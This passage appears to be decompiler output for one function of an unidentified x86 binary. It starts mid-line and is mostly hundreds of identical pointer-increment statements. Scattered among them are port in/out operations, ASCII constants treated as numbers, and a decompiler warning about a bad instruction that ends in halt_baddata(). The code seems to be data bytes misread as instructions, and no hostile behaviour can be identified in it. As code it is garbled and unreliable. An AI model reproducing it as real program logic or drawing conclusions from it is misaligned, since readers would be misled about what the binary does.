= *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                uVar15 = cVar14 + 0x73;\n                pcVar22 = pcVar21 & 0xffffff00 | uVar15;\n                *pcVar22 = *pcVar22 + uVar15;\n                *pcVar22 = *pcVar22 + uVar15;\n                *pcVar21 = *pcVar21 + (uVar35 >> 8);\n                in_AF = 9 < (uVar15 & 0xf) | in_AF;\n                puVar25 = CONCAT13(unaff_EBX, unaff_EDI >> 8);\n                uStack36 = uVar20;\n                puVar31 = CONCAT13(uStack36, unaff_EBX >> 8);\n                Stack35 = uVar20 >> 8;\n                puVar47 = CONCAT13(arg_8h, Stack35);\n                puVar28 = uVar19 >> 8;\n                puVar43 = 0x60000000;\n                pcVar21 = CONCAT13(uStack16, 0xea);\n                puVar23 = CONCAT13(var_8h, unaff_ESI >> 8);\n                uVar4 = in(0);\n                *puVar25 = uVar4;\n                puVar49 = puVar25 + 2;\n                uVar4 = in(0);\n                puVar25[1] = uVar4;\n                puVar38 = puVar31 + 1;\n                out(*puVar31, 0);\n                puVar1 = puVar23 + 0x73;\n                iVar6 = (unaff_ESI >> 8 & 3) - (*puVar1 & 3);\n                *puVar1 = *puVar1 + in_AF * iVar6;\n                uStack15 = puVar38;\n                uStack14 = puVar38 >> 8;\n                uStack13 = puVar38 >> 0x10;\n                var_8h._0_1_ = puVar38 >> 0x18;\n                if (iVar6 < 1) {\n                    pcVar22 = puVar23 + 2;\n                    puVar2 = pcVar21 * 4 + 0x44;\n                    *puVar2 = *puVar2;\n                    uVar16 = pcVar22;\n                    *pcVar22 = *pcVar22 + uVar16;\n                    in_AF = 9 < (uVar16 & 0xf) | in_AF;\n                    uVar44 = CONCAT11((pcVar22 >> 8) - in_AF, uVar16 + in_AF * -6) & 0xff0f;\n                    puVar23 = pcVar22 & 0xffff0000 | uVar44;\n                    bVar54 = SCARRY4(pcVar21, 1);\n                    pcVar21 = pcVar21 + 1;\n                    cVar14 = uVar44;\n                    if (pcVar21 < 0) {\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                    }\n                    else if (!bVar54) {\n                        puVar47 = *(puVar25 + 0x70) * 0x64747340;\n                        puVar23 = puVar23 + 2;\n                        cVar14 = puVar23;\n                        *pcVar21 = *pcVar21 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *pcVar21 = *pcVar21 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar49 = *puVar49 + pcVar21;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar49 = *puVar49 + pcVar21;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        *puVar23 = *puVar23 + cVar14;\n                        uVar16 = uStack15;\n                        uVar5 = uStack14;\n                        uVar11 = uStack13;\n                        uVar12 = var_8h;\n                        goto code_r0x0046627d;\n                    }\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    uVar20 = LocalDescriptorTableRegister();\n                    *puVar23 = uVar20;\n                }\n                else {\ncode_r0x0046627d:\n                    var_8h._0_1_ = uVar12;\n                    uStack13 = uVar11;\n                    uStack14 = uVar5;\n                    uStack15 = uVar16;\n                    cVar14 = puVar23;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar49 = *puVar49 + pcVar21;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar23 = *puVar23 + cVar14;\n                    *puVar49 = *puVar49 + pcVar21;\n                    *puVar23 = *puVar23 + cVar14;\n                }\n                uVar16 = puVar23;\n                *puVar23 = *puVar23 + uVar16;\n                *puVar23 = *puVar23 + uVar16;\n                *pcVar21 = *pcVar21 + uVar16;\n                *puVar23 = *puVar23 + uVar16;\n                *0x60000000 = *0x60000000 + uVar16;\n                *puVar23 = *puVar23 + uVar16;\n                *puVar28 = *puVar28 + uVar16;\n                *puVar23 = *puVar23 + uVar16;\n                pcVar22 = pcVar21 * 4 + 0x44;\n                *pcVar22 = *pcVar22 + (pcVar21 >> 8);\n                *puVar23 = *puVar23 + uVar16;\n                in_AF = 9 < (uVar16 & 0xf) | in_AF;\n                pcVar22 = puVar23 & 0xffff0000 | CONCAT11((puVar23 >> 8) - in_AF, uVar16 + in_AF * -6) & 0xff0f;\n                puVar36 = pcVar21 + 1;\n                iVar6 = *0x10;\n                iVar41 = in_stack_00000021;\n                puVar48 = puVar38;\n                if (in_AF) {\ncode_r0x0046633f:\n                    *pcVar22 = *pcVar22 + pcVar22;\n                    *pcVar22 = *pcVar22 + pcVar22;\n                    *puVar48 = *puVar48 + (puVar36 >> 8);\n                    puVar38 = puVar49;\ncode_r0x00466345:\n                    in_AF = 9 < (pcVar22 & 0xf) | in_AF;\n                    uVar19 = pcVar22 & 0xffff0000 | CONCAT11((pcVar22 >> 8) - in_AF, pcVar22 + in_AF * -6) & 0xff0f;\n                    in_stack_00000081 = puVar48 >> 8;\n                    in_stack_00000083 = puVar48 >> 0x18;\n                    iVar8 = *(puVar38 + 0x73) * 0x7361625f;\n                    puVar47 = iVar8;\n                    if (puVar47 == iVar8) {\n                        uVar19 = uVar19 + 2;\n                        in_stack_0000007d = iVar8;\n                        in_stack_0000007f = iVar8 >> 0x10;\n                        in_stack_00000080 = iVar8 >> 0x18;\n                        in_AF = 9 < (uVar19 & 0xf) | in_AF;\n                        uVar19 = uVar19 & 0xffff0000 |\n                                 (CONCAT11((uVar19 >> 8) - in_AF, uVar19 + in_AF * -6) & 0xff0f) & 0xffffff63;\n                    }\n                    else {\n                        pcVar21 = uVar19 + 3;\n                        *pcVar21 = *pcVar21 + pcVar21;\n                        uVar16 = pcVar21 + 0x73;\n                        pcVar22 = pcVar21 & 0xffffff00 | uVar16;\n                        *pcVar22 = *pcVar22 + uVar16;\n                        *pcVar22 = *pcVar22 + uVar16;\n                        *puVar48 = *puVar48 + (puVar36 + 1 >> 8);\n                        in_AF = 9 < (uVar16 & 0xf) | in_AF;\n                        uVar44 = CONCAT11(((pcVar21 & 0xffffff00) >> 8) - in_AF, uVar16 + in_AF * -6) & 0xff0f;\n                        in_stack_0000007d = SUB42(puVar48, 0);\n                        in_stack_0000007f = puVar48 >> 0x10;\n                        uVar16 = uVar44;\n                        in_AF = 9 < uVar16 | in_AF;\n                        uVar19 = pcVar21 & 0xffff0000 | CONCAT11((uVar44 >> 8) - in_AF, uVar16 + in_AF * -6) & 0xff0f;\n                        out(*puVar48, puVar43);\n                        puVar48 = puVar48 + 1;\n                        in_stack_00000080 = in_stack_00000083;\n                    }\n                    puVar36 = puVar36 + 1;\n                    in_stack_00000079 = 0x7261;\n                    in_stack_0000007b = 0x5f;\n                    in_stack_0000007c = 0x74;\n                    iVar8 = *(puVar28 + puVar48 * 2 + 0x40) * 0x74734044;\n                    puVar48 = iVar8;\n                    if (puVar48 != iVar8) {\n                        iVar24 = uVar19 + 4;\ncode_r0x004663e4:\n                        pcVar22 = iVar24 + 1;\n                        uVar16 = pcVar22;\n                        *pcVar22 = *pcVar22 + uVar16;\n                        pcVar21 = puVar36 * 4 + 0x44;\n                        *pcVar21 = *pcVar21 + (puVar36 >> 8);\n                        *pcVar22 = *pcVar22 + uVar16;\n                        in_AF = 9 < (uVar16 & 0xf) | in_AF;\n                        pcVar22 = pcVar22 & 0xffff0000 | CONCAT11((pcVar22 >> 8) - in_AF, uVar16 + in_AF * -6) & 0xff0f;\n                        puVar49 = puVar48;\ncode_r0x004663f2:\n                        puVar48 = puVar49;\n                        puVar37 = puVar36 + 1;\n                        in_stack_00000075 = SUB41(puVar48, 0);\n                        in_stack_00000076 = puVar48 >> 8;\n                        in_stack_00000077 = puVar48 >> 0x10;\n                        in_stack_00000078 = puVar48 >> 0x18;\n                        uVar16 = 9 < (pcVar22 & 0xf) | in_AF;\n                        uVar15 = pcVar22 + uVar16 * -6;\n                        uVar19 = pcVar22 & 0xffff0000 |\n                                 (CONCAT11((pcVar22 >> 8) - uVar16, uVar15) & 0xff0f) & 0xffffff63;\n                        in_stack_0000009d = puVar47;\n                        if ((uVar15 & 3) == 0) goto code_r0x00466472;\n                        in_AF = false;\n                        if (uVar19 != 0xfffffffe) {\n                            pcVar21 = uVar19 + 3;\n                            goto code_r0x0046652f;\n                        }\n                        cVar14 = puVar37 >> 8;\n                        in_stack_0000006f = SUB41(puVar47, 0);\n                        in_stack_00000070 = puVar47 >> 8;\n                        in_stack_00000071 = puVar47 >> 0x10;\n                        in_stack_00000072 = puVar47 >> 0x18;\n                        in_stack_0000006b = 0x61;\n                        in_stack_0000006c = 0x72;\n                        in_stack_0000006d = '_';\n                        in_stack_0000006e = 0x74;\n                        iVar8 = *(puVar28 + puVar48 * 2 + 0x40) * 0x74734044;\n                        puVar48 = iVar8;\n                        in_AF = puVar48 != iVar8;\n                        pcVar22 = ((CONCAT11(-uVar16, uVar16 * -6) & 0xff0f) & 0xffffff63) + 1;\ncode_r0x004665a7:\n                        if (in_AF) {\n                            pcVar22 = pcVar22 + 4;\n                            *pcVar22 = *pcVar22 + pcVar22;\n                            pcVar21 = pcVar22 & 0xffffff00 | pcVar22 + 0x73;\n                            goto code_r0x004665b3;\n                        }\n                        puVar23 = CONCAT13(in_stack_0000006f, \n                                           CONCAT12(in_stack_0000006e, CONCAT11(in_stack_0000006d, in_stack_0000006c)));\n                        iVar24 = CONCAT13(in_stack_00000073, \n                                          CONCAT12(in_stack_00000072, CONCAT11(in_stack_00000071, in_stack_00000070)));\n                        in_stack_0000009d =\n                             CONCAT13(in_stack_00000077, \n                                      CONCAT12(in_stack_00000076, CONCAT11(in_stack_00000075, in_stack_00000074)));\n                        puVar28 = CONCAT13(in_stack_0000007f, CONCAT21(in_stack_0000007d, in_stack_0000007c));\n                        puVar43 = CONCAT13(in_stack_00000083, CONCAT21(in_stack_00000081, in_stack_00000080));\n                        puVar37 = CONCAT13(in_stack_00000087, CONCAT21(in_stack_00000085, in_stack_00000084));\n                        puVar31 = puVar23 + 1;\n                        uVar20 = in(CONCAT21(in_stack_00000081, in_stack_00000080));\n                        *puVar23 = uVar20;\n                        uVar19 = CONCAT13(in_stack_0000008b, \n                                          CONCAT12(in_stack_0000008a, CONCAT11(in_stack_00000089, in_stack_00000088))) +\n                                 1;\n                        in_stack_0000008a = in_stack_00000074;\n                        in_stack_0000008b = in_stack_00000075;\n                        in_stack_0000008c = in_stack_00000076;\n                        in_stack_0000008d = in_stack_00000077;\n                        uVar16 = 9 < (uVar19 & 0xf) | uVar16;\n                        uVar19 = uVar19 & 0xffff0000 |\n                                 (CONCAT11((uVar19 >> 8) - uVar16, uVar19 + uVar16 * -6) & 0xff0f) & 0xffffff63;\n                        in_stack_00000070 = 0x61;\n                        in_stack_00000071 = 0x72;\n                        in_stack_00000072 = 0x5f;\n                        in_stack_00000073 = 0x74;\n                        goto code_r0x0046662e;\n                    }\ncode_r0x0046645f:\n                    puVar38 = in_stack_00000095 + 1;\n                    uVar19 = in(in_stack_000000a9);\n                    *in_stack_00000095 = uVar19;\n                    uVar19 = in_stack_000000b1 + 1;\n                    in_stack_0000000a = in_stack_0000009d;\n                    uVar16 = 9 < (uVar19 & 0xf) | in_AF;\n                    uVar19 = uVar19 & 0xffff0000 |\n                             (CONCAT11((uVar19 >> 8) - uVar16, uVar19 + uVar16 * -6) & 0xff0f) & 0xffffff63;\n                    arg_8h._2_1_ = 'a';\n                    arg_8h._3_1_ = 0x72;\n                    in_stack_00000008 = 0x5f;\n                    in_stack_00000009 = 0x74;\n                    puVar37 = in_stack_000000ad;\n                    puVar43 = in_stack_000000a9;\n                    puVar28 = in_stack_000000a5;\n                    puVar48 = in_stack_00000099;\ncode_r0x00466472:\n                    iVar8 = *(puVar28 + puVar48 * 2 + 0x40) * 0x74734044;\n                    puVar48 = iVar8;\n                    bVar54 = puVar48 != iVar8;\n                    pcVar22 = uVar19 + 3;\n                    in_AF = uVar16;\n                    if (bVar54) {\ncode_r0x00466480:\n                        pcVar22 = pcVar22 + 2;\n                        pcVar21 = puVar37 * 4 + 0x44;\n                        *pcVar21 = *pcVar21 + (puVar37 >> 8);\n                        *pcVar22 = *pcVar22 + pcVar22;\n                        puVar49 = puVar48;\ncode_r0x0046648c:\n                        in_AF = 9 < (pcVar22 & 0xf) | in_AF;\n                        uVar44 = CONCAT11((pcVar22 >> 8) - in_AF, pcVar22 + in_AF * -6) & 0xff0f;\n                        puVar37 = puVar37 + 1;\n                        in_stack_00000077 = SUB41(puVar49, 0);\n                        in_stack_00000078 = puVar49 >> 8;\n                        in_stack_00000079 = puVar49 >> 0x10;\n                        uVar15 = uVar44;\n                        uVar16 = 9 < uVar15 | in_AF;\n                        in_AF = 0;\n                        pcVar22 = pcVar22 & 0xffff0000 |\n                                  (CONCAT11((uVar44 >> 8) - uVar16, uVar15 + uVar16 * -6) & 0xff0f) & 0xffffff63;\ncode_r0x00466493:\n                        puVar48 = puVar49 + 1;\n                        out(*puVar49, puVar43);\n                        puVar1 = puVar49 + in_GS_OFFSET + 0x78;\n                        *puVar1 = *puVar1 + in_AF * ((puVar48 & 3) - (*puVar1 & 3));\n                        pcVar22 = pcVar22 + 1;\ncode_r0x0046649b:\n                        if (in_AF) {\n                            pcVar22 = pcVar22 + 2;\n                            pcVar21 = puVar37 * 4 + 0x44;\n                            *pcVar21 = *pcVar21 + (puVar37 >> 8);\n                            uVar15 = pcVar22;\n                            *pcVar22 = *pcVar22 + uVar15;\n                            in_AF = 9 < (uVar15 & 0xf) | uVar16;\n                            pcVar21 = pcVar22 & 0xffff0000 |\n                                      CONCAT11((pcVar22 >> 8) - in_AF, uVar15 + in_AF * -6) & 0xff0f;\n                            puVar38 = puVar37 + 1;\n                            in_stack_00000075 = SUB41(puVar48, 0);\n                            in_stack_00000076 = puVar48 >> 8;\n                            in_stack_00000077 = puVar48 >> 0x10;\n                            in_stack_00000078 = puVar48 >> 0x18;\n                            puVar37 = puVar37 + 0x1d;\n                            iVar7 = (iVar6 + 0x79U & 3) - (*puVar37 & 3);\n                            bVar54 = 0 < iVar7;\n                            *puVar37 = *puVar37 + in_AF * iVar7;\n                            uVar16 = in_AF;\ncode_r0x004664b7:\n                            puVar37 = puVar38;\n                            if (bVar54) goto code_r0x004664f9;\n                            cVar14 = puVar38 >> 8;\n                            if (in_AF) {\n                                pcVar21 = pcVar21 + 2;\n                                *pcVar21 = *pcVar21 + pcVar21;\n                                in_stack_00000091 = pcVar21 & 0xffffff00 | pcVar21 + 0x73;\n                                goto code_r0x004664c3;\n                            }\n                        }\n                        else {\n                            if (in_AF) goto code_r0x0046657b;\n                            uVar20 = in(CONCAT11(in_stack_0000008e, in_stack_0000008d));\n                            *CONCAT13(in_stack_0000007c, CONCAT12(in_stack_0000007b, in_stack_00000079)) = uVar20;\n                            puVar25 = in_stack_00000095 + 1;\n                            in_stack_00000095 =\n                                 in_stack_00000095 & 0xff | CONCAT12(in_stack_00000083, in_stack_00000081) << 8;\n                            in_stack_00000099 = in_stack_00000099 & 0xffffff00 | in_stack_00000084;\n                            uVar16 = 9 < (puVar25 & 0xf) | uVar16;\n                            in_stack_0000006b = 0x61;\n                            in_stack_0000006c = 0x72;\n                            in_stack_0000006d = '_';\n                            in_stack_0000006e = 0x74;\n                            iVar8 = *(CONCAT13(in_stack_0000008c, \n                                               CONCAT12(in_stack_0000008b, \n                                                        CONCAT11(in_stack_0000008a, in_stack_00000089))) + 0x40 +\n                                     CONCAT13(in_stack_00000080, CONCAT12(in_stack_0000007f, in_stack_0000007d)) * 2) *\n                                    0x74734044;\n                            puVar48 = iVar8;\n                            in_AF = puVar48 != iVar8;\n                            pcVar21 = (puVar25 & 0xffff0000 |\n                                      (CONCAT11((puVar25 >> 8) - uVar16, puVar25 + uVar16 * -6) & 0xff0f) & 0xffffff63)\n                                      + 1;\n                            puVar37 = in_stack_00000091;\n                        }\ncode_r0x0046652f:\n                        cVar14 = puVar37 >> 8;\n                        pcVar22 = pcVar21 + 2;\n                        if (in_AF) {\n                            pcVar21 = pcVar21 + 4;\n                            *pcVar21 = *pcVar21 + pcVar21;\n                            in_stack_000000ad = pcVar21 & 0xffffff00 | pcVar21 + 0x73;\n                            in_stack_0000004c = puVar48;\n                            goto code_r0x0046653b;\n                        }\n                        goto code_r0x004665a7;\n                    }\ncode_r0x004664f4:\n                    if (bVar54) {\n                        pcVar21 = pcVar22 + 2;\ncode_r0x004664f9:\n                        uVar15 = pcVar21;\n                        *pcVar21 = *pcVar21 + uVar15;\n                        pcVar22 = puVar37 * 4 + 0x44;\n                        *pcVar22 = *pcVar22 + (puVar37 >> 8);\n                        *pcVar21 = *pcVar21 + uVar15;\n                        uVar16 = 9 < (uVar15 & 0xf) | uVar16;\n                        uVar16 = 9 < (uVar15 + uVar16 * -6 & 0xf) | uVar16;\n                        puVar48 = CONCAT13(arg_8h._2_1_, CONCAT12(arg_8h._1_1_, CONCAT11(arg_8h, unaff_retaddr_01)));\n                        puVar37 = CONCAT22(in_stack_00000019, in_stack_00000017);\n                        pcVar22 = CONCAT22(in_stack_0000001d, in_stack_0000001b);\n                        *pcVar22 = *pcVar22 + in_stack_0000001b;\n                        *pcVar22 = *pcVar22 + in_stack_0000001b;\ncode_r0x0046657b:\n                        *puVar48 = *puVar48 + (puVar37 >> 8);\n                        uVar16 = 9 < (pcVar22 & 0xf) | uVar16;\n                        pcVar21 = pcVar22 & 0xffff0000 |\n                                  CONCAT11((pcVar22 >> 8) - uVar16, pcVar22 + uVar16 * -6) & 0xff0f;\ncode_r0x0046656e:\n                        pcVar21 = pcVar21 + 2;\n                        uVar15 = pcVar21;\n                        *pcVar21 = *pcVar21 + uVar15;\n                        pcVar22 = puVar37 * 4 + 0x44;\n                        *pcVar22 = *pcVar22 + (puVar37 >> 8);\n                        *pcVar21 = *pcVar21 + uVar15;\n                        uVar16 = 9 < (uVar15 & 0xf) | uVar16;\n                        cStack1 = puVar48;\n                        uVar16 = 9 < (uVar15 + uVar16 * -6 & 0xf) | uVar16;\n                        puVar31 = puVar48 & 0xffff0000 | CONCAT11(puVar48 >> 8, cStack1);\n                        puVar38 = CONCAT13(arg_8h._2_1_, CONCAT12(arg_8h._1_1_, CONCAT11(arg_8h, unaff_retaddr_01)));\n                        in_stack_0000009d =\n                             CONCAT13(in_stack_0000000a, \n                                      CONCAT12(in_stack_00000009, CONCAT11(in_stack_00000008, arg_8h._3_1_)));\n                        puVar28 = CONCAT22(in_stack_00000011, in_stack_0000000f);\n                        puVar43 = CONCAT22(in_stack_00000015, in_stack_00000013);\n                        puVar37 = CONCAT22(in_stack_00000019, in_stack_00000017);\n                        uVar19 = CONCAT22(in_stack_0000001d, in_stack_0000001b);\n                    }\n                    else {\n                        pcVar21 = pcVar22 + 2;\n                        if (bVar54) goto code_r0x0046656e;\n                        pcVar22 = pcVar22 + 4;\n                        cStack1 = puVar48;\n                        uVar16 = 9 < pcVar22 | uVar16;\n                        uVar19 = pcVar22 & 0xffff0000 | CONCAT11((pcVar22 >> 8) - uVar16, pcVar22) & 0xffffff61;\n                        uVar42 = SUB42(puVar43, 0);\n                        uVar5 = in(uVar42);\n                        *puVar38 = uVar5;\n                        puVar31 = puVar38 + 2;\n                        uVar5 = in(uVar42);\n                        *(puVar38 + 1) = uVar5;\n                        puVar38 = puVar48 + 1;\n                        out(*puVar48, uVar42);\n                        *(puVar37 + 0x1d) = *(puVar37 + 0x1d);\n                    }\n                    puVar49 = puVar38 + 1;\n                    out(*puVar38, puVar43);\n                    uVar19 = (uVar19 + 1 & 0xffffff00 | uVar19 + 1 ^ *(uVar19 + 0x41)) + 1;\n                    in_stack_00000068 = SUB41(puVar49, 0);\n                    in_stack_00000069 = puVar49 >> 8;\n                    in_stack_0000006a = puVar49 >> 0x10;\n                    in_stack_0000006b = puVar49 >> 0x18;\n                    uVar16 = 9 < (uVar19 & 0xf) | uVar16;\n                    uVar19 = uVar19 & 0xffff0000 | CONCAT11((uVar19 >> 8) - uVar16, uVar19 + uVar16 * -6) & 0xff0f;\ncode_r0x004666e9:\n                    uVar16 = 9 < uVar19 | uVar16;\n                    uVar19 = uVar19 & 0xffff0000 | CONCAT11((uVar19 >> 8) - uVar16, uVar19) & 0xffffff61;\n                    uVar42 = SUB42(puVar43, 0);\n                    uVar5 = in(uVar42);\n                    *puVar31 = uVar5;\n                    puVar52 = puVar31 + 2;\n                    uVar5 = in(uVar42);\n                    *(puVar31 + 1) = uVar5;\n                    out(*puVar49, uVar42);\n                    *(puVar37 + 0x1d) = *(puVar37 + 0x1d);\n                    puVar47 = puVar49 + 2;\n                    out(puVar49[1], uVar42);\n                    uVar51 = uVar19 + 1;\n                    uVar15 = false;\n                    ppcVar26 = uVar51 & 0xffffff00 | uVar51 ^ *(uVar19 + 0x41);\ncode_r0x00466770:\n                    puVar36 = puVar47 + 1;\n                    out(*puVar47, puVar43);\n                    puVar47 = puVar52 & 0xffff0000 | CONCAT11(in_stack_00000071, in_stack_00000070);\n                    puVar49 = puVar36;\n                    if (uVar15) {\ncode_r0x004667d6:\n                        puVar37 = puVar37 + 1;\n                        in_stack_0000006b = SUB41(puVar36, 0);\n                        in_stack_0000006c = puVar36 >> 8;\n                        in_stack_0000006d = puVar36 >> 0x10;\n                        in_stack_0000006e = puVar36 >> 0x18;\ncode_r0x004667d8:\n                        iVar24 = CONCAT13(in_stack_0000006e, \n                                          CONCAT12(in_stack_0000006d, CONCAT11(in_stack_0000006c, in_stack_0000006b)));\n                        puVar49 = iVar24 + 1;\n                        puVar50 = puVar36 + 1;\n                        out(*puVar36, puVar43);\n                        in_stack_00000035 = puVar37;\n                        in_stack_00000031 = puVar43;\n                        in_stack_0000002d = puVar28;\n                        puVar47 = puVar50;\n                        if (uVar15) {\n                            uVar15 = uVar16;\n                            if (puVar49 != NULL) {\n                                ppcVar26 = ppcVar26 + 1;\n                                goto code_r0x00466849;\n                            }\ncode_r0x004668ae:\n                            iVar8 = *(puVar50 + 0x6b) * 0x61776d75;\n                            in_stack_0000009d = iVar8;\n                            bVar54 = in_stack_0000009d != iVar8;\n                            in_stack_0000002d = puVar28;\n                            puVar47 = puVar50;\ncode_r0x004668b5:\n                            cVar14 = ppcVar26;\n                            if (bVar54) {\n                                *ppcVar26 = *ppcVar26 + cVar14;\n                                *ppcVar26 = *ppcVar26 + cVar14;\ncode_r0x00466920:\n                                cVar14 = ppcVar26;\n                                *ppcVar26 = *ppcVar26 + cVar14;\n                                *ppcVar26 = *ppcVar26 + cVar14;\n                                *ppcVar26 = *ppcVar26 + cVar14;\n                                *ppcVar26 = *ppcVar26 + cVar14;\n                                *ppcVar26 = *ppcVar26 + cVar14;\n                                *ppcVar26 = *ppcVar26 + cVar14;\n                                pcVar21 = ppcVar26 & 0xffffff00 | cVar14 + *ppcVar26;\n                                *pcVar21 = *pcVar21 + cVar14 + *ppcVar26;\n    // WARNING: Bad instruction - Truncating control flow here\n                                halt_baddata();\n                            }\n                            ppcVar26 = ppcVar26 & 0xffffff00 | cVar14 - 0x20;\n                            